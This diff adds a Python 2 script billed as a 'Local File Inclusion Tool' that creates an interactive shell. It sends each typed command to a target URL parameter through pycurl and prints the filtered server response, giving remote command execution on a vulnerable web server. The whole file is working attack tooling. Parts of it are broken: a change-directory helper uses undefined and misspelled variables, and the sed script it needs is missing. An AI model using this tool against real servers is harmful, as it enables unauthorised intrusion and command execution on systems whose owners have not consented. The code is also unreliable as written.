@@ -1,0 +1,95 @@
+#!/usr/bin/python
+
+import argparse
+import sys, os
+from subprocess import call
+import pycurl
+from StringIO import StringIO
+
+
+parser = argparse.ArgumentParser(description='Create an interactive shell with a local file inclusion vulnerability')
+parser.add_argument('-u','--url', help='LFI url',required=True)
+parser.add_argument('-v','--variable', help='Command variable',required=True)
+args = parser.parse_args()
+
+def printHeader():
+    print ("""
+    
+    
+     /$$       /$$$$$$$$ /$$$$$$        /$$$$$$$$
+    | $$      | $$_____/|_  $$_/       |__  $$__/             __     __
+    | $$      | $$        | $$   /$$$$$$$ | $$               /  \~~~/  \ 
+    | $$      | $$$$$     | $$  | $$__  $$| $$         ,----(     ..    )
+    | $$      | $$__/     | $$  | $$  \ $$| $$        /      \__     __/
+    | $$      | $$        | $$  | $$  | $$| $$       /|         (\  |(
+    | $$$$$$$$| $$       /$$$$$$| $$  | $$| $$      ^ \   /___\  /\ |
+    |________/|__/      |______/|__/  |__/|__/         |__|   |__|-"
+    
+       Local     File        Inclusion     Tool
+    """)
+
+
+
+def parse(temp):
+    os.system("sed -i -f script.sed temp.txt")
+    os.system("awk '!seen[$0]++' temp.txt > temp2.txt")
+    os.system("awk '!seen[$1]++' temp.txt > temp2.txt")
+
+
+def chngDir(command):
+    if "cd" in command:
+        command = command.replace("cd ", "")
+        if(newDir):
+            olDir = newDir
+            newDir = oldDir+newDir
+        newDir = command
+
+    if newDir != "":
+        if "ls" in command:
+            command = command+" "+newDir
+
+
+
+def curl(temp, url):
+    buffer = StringIO()
+    c = pycurl.Curl()
+    c.setopt(c.URL, url)
+    c.setopt(c.WRITEDATA, buffer)
+    c.perform()
+    c.close()
+    body = buffer.getvalue()
+
+    temp.write(body)
+
+
+
+command = ""
+newDir = ""
+oldDir = ""
+
+
+
+printHeader()
+
+
+#####  MAIN METHOD #####
+while(command != "exit"):
+    command = raw_input("$ ")
+
+    command = command.replace(" ", "%20")
+    #chngDir(command)
+    url = args.url+"&"+args.variable+"="+command
+    temp = open("temp.txt", "w+")
+    curl(temp, url)
+
+
+    parse(temp)
+    temp.close
+
+    temp2 = open("temp2.txt", "r")
+    print temp2.read()
+    temp2.close
+    call(["rm", "temp.txt"])
+    call(["rm", "temp2.txt"])
+
+
